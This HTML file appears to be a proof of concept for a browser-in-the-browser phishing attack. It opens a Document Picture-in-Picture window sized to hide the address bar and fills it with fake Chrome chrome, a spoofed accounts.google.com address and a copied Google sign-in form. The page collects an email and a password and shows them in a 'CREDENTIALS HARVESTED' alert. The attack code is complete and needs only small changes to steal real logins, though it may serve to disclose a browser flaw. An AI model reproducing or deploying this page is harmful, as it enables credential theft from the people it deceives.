<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Site Verification Required</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      height: 100vh;
      background: #f0f0f0;
      font-family: -apple-system, BlinkMacSystemFont, sans-serif;
    }
    h2 { color: #202124; margin-bottom: 12px; }
    p { color: #e53935; font-size: 13px; margin-bottom: 20px; }
    button {
      padding: 14px 32px;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      background: #e53935;
      color: white;
      border: none;
      border-radius: 8px;
      font-family: inherit;
    }
    button:hover { background: #c62828; }
  </style>
</head>
<body>

  <h2>Site Verification Required</h2>
  <p>🔴 VULNERABLE — PiP 1000×1000 (Address bar hidden)</p>
  <button onclick="openPip()">Verify</button>

  <script>
    function getBiB() {
      return `<style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { font-family:-apple-system,BlinkMacSystemFont,sans-serif; background:#202124; overflow:hidden; -webkit-font-smoothing:antialiased; }
        .title-bar { height:38px; background:#292b2f; display:flex; align-items:center; padding:0 12px; }
        .tl { display:flex; gap:8px; }
        .tl span { width:12px; height:12px; border-radius:50%; display:inline-block; }
        .tl-r { background:#ff5f57; } .tl-y { background:#febc2e; } .tl-g { background:#28c840; }
        .tab-bar { height:36px; background:#292b2f; display:flex; align-items:flex-end; padding:0 8px 0 80px; }
        .tab { height:30px; background:#202124; border-radius:8px 8px 0 0; display:flex; align-items:center; padding:0 14px; gap:8px; min-width:200px; }
        .tab-fav { width:16px; height:16px; background:url('https://www.google.com/favicon.ico') center/contain no-repeat; }
        .tab-t { font-size:12px; color:#e8eaed; flex:1; overflow:hidden; white-space:nowrap; text-overflow:ellipsis; }
        .tab-x { font-size:14px; color:#9aa0a6; cursor:pointer; }
        .omni-row { height:42px; background:#202124; display:flex; align-items:center; padding:0 12px; gap:10px; }
        .nav { color:#9aa0a6; font-size:18px; width:28px; text-align:center; user-select:none; }
        .omni { flex:1; height:30px; background:#303134; border-radius:15px; display:flex; align-items:center; padding:0 14px; gap:8px; }
        .lock { color:#9aa0a6; font-size:14px; }
        .url { font-size:13px; }
        .url-d { color:#e8eaed; } .url-p { color:#9aa0a6; }
        .omni-a { display:flex; gap:8px; color:#9aa0a6; font-size:16px; }
        .bm-bar { height:28px; background:#202124; display:flex; align-items:center; padding:0 12px; border-bottom:1px solid #3c4043; gap:4px; }
        .bm { font-size:11px; color:#9aa0a6; padding:4px 8px; white-space:nowrap; }
        .page { background:#f8f9fa; min-height:calc(100vh - 144px); display:flex; align-items:center; justify-content:center; }
        .card { background:white; border-radius:8px; box-shadow:0 1px 3px rgba(0,0,0,.12); padding:48px 40px 36px; width:400px; max-width:90%; text-align:center; }
        .card img { width:75px; margin-bottom:20px; }
        .card h1 { font-size:24px; font-weight:400; color:#202124; margin-bottom:4px; }
        .card .sub { font-size:16px; color:#202124; margin-bottom:28px; }
        .inp { width:100%; padding:13px 15px; font-size:16px; font-family:inherit; border:1px solid #dadce0; border-radius:4px; outline:none; color:#202124; margin-bottom:12px; }
        .inp:focus { border-color:#1a73e8; border-width:2px; padding:12px 14px; }
        .fl { display:block; text-align:left; color:#1a73e8; text-decoration:none; font-size:14px; font-weight:500; margin-bottom:28px; }
        .ht { font-size:14px; color:#5f6368; text-align:left; margin-bottom:32px; line-height:1.5; }
        .ht a { color:#1a73e8; text-decoration:none; }
        .br { display:flex; justify-content:space-between; align-items:center; }
        .cl { color:#1a73e8; text-decoration:none; font-size:14px; font-weight:500; }
        .nb { background:#1a73e8; color:white; border:none; padding:10px 24px; border-radius:4px; font-size:14px; font-weight:500; cursor:pointer; font-family:inherit; }
        .nb:hover { background:#1765cc; }
        .ft { display:flex; justify-content:space-between; margin-top:40px; align-items:center; }
        .ft select { border:none; background:transparent; color:#5f6368; font-size:13px; }
        .ft a { color:#5f6368; text-decoration:none; font-size:13px; margin-left:16px; }
      </style>
      <div class="title-bar"><div class="tl"><span class="tl-r"></span><span class="tl-y"></span><span class="tl-g"></span></div></div>
      <div class="tab-bar"><div class="tab"><div class="tab-fav"></div><span class="tab-t">Sign in - Google Accounts</span><span class="tab-x">×</span></div></div>
      <div class="omni-row"><span class="nav">‹</span><span class="nav">›</span><span class="nav">⟳</span><div class="omni"><span class="lock">🔒</span><span class="url"><span class="url-d">accounts.google.com</span><span class="url-p">/signin/v2/identifier</span></span></div><div class="omni-a"><span>☆</span><span>⋮</span></div></div>
      <div class="bm-bar"><span class="bm">📁 Gmail</span><span class="bm">📁 YouTube</span><span class="bm">📁 Drive</span><span class="bm">📁 Calendar</span></div>
      <div class="page"><div class="card">
        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google">
        <h1>Sign in</h1>
        <p class="sub">Use your Google Account</p>
        <input class="inp" type="email" placeholder="Email or phone" id="bib-email">
        <a href="#" class="fl">Forgot email?</a>
        <p class="ht">Not your computer? Use a private browsing window to sign in. <a href="#">Learn more about using Guest mode</a></p>
        <div class="br"><a href="#" class="cl">Create account</a><button class="nb" id="bib-next">Next</button></div>
        <div class="ft"><select><option>English (United States)</option></select><div><a href="#">Help</a><a href="#">Privacy</a><a href="#">Terms</a></div></div>
      </div></div>`;
    }

    async function openPip() {
      try {
        const pip = await documentPictureInPicture.requestWindow({
          width: 1500,
          height: 1500,
        });
        pip.document.body.innerHTML = getBiB();

        const nextBtn = pip.document.getElementById('bib-next');
        const emailInput = pip.document.getElementById('bib-email');
        if (!nextBtn || !emailInput) return;

        nextBtn.addEventListener('click', () => {
          const email = emailInput.value;
          if (!email) return;
          emailInput.style.display = 'none';
          const pw = pip.document.createElement('input');
          pw.className = 'inp'; pw.type = 'password'; pw.placeholder = 'Enter your password'; pw.id = 'bib-pw';
          emailInput.parentNode.insertBefore(pw, emailInput.nextSibling);
          pw.focus();
          pip.document.querySelector('.card h1').textContent = 'Welcome';
          pip.document.querySelector('.card .sub').innerHTML = '<div style="display:inline-flex;align-items:center;gap:6px;padding:6px 12px;border:1px solid #dadce0;border-radius:16px;font-size:14px;color:#3c4043;">👤 ' + email + '</div>';
          pip.document.querySelector('.fl').textContent = 'Forgot password?';

          nextBtn.addEventListener('click', () => {
            const p = pip.document.getElementById('bib-pw');
            if (p && p.value) {
              alert('🚨 CREDENTIALS HARVESTED (VULNERABLE - 1000x1000)\n\nEmail: ' + email + '\nPassword: ' + p.value + '\n\nAddress bar: HIDDEN ❌\nUser saw only fake BiB chrome');
            }
          }, { once: true });
        }, { once: true });

      } catch (e) {
        alert('Error: ' + e.message);
      }
    }
  </script>
</body>
</html>
